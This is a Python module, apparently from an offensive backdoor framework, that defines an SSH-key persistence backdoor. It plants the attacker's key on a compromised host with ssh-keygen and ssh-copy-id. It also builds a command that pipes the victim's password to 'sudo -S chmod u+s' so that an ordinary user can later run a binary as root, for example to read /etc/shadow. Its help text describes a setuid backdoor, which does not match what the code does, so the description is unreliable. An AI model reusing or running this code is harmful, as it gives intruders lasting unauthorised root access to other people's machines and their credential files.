from backdoors.backdoor import *

class SSHKey(Backdoor):
    prompt = Fore.RED + "(sshkey) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using ssh keys backdoor..."
        self.core = core
        self.options = {
                }
        self.allow_modules = False
        self.help_text = INFO + "The SetUID backdoor works by setting the setuid bit on a binary while the user has root acccess, so that when that binary is later run by a user without root access, the binary is executed with root access.\n" + INFO +"By default, this backdoor flips the setuid bit on nano, so that if root access is ever lost, the attacker can SSH back in as an unpriviledged user and still be able to run nano (or any binary) as root. ('nano /etc/shadow')."

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S chmod u+s %s" % (self.get_value("program"))
 
    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command("echo -e \"\n\n\n\" | ssh-keygen -t rsa")
        os.system("ssh-copy-id " + target.uname + "@" + target.hostname)
        #os.system("sshpass -p %s ssh-copy-id %s@%s" % (t.pword, t.uname, t.hostname))
        print(GOOD + "Added SSH keys to target.")
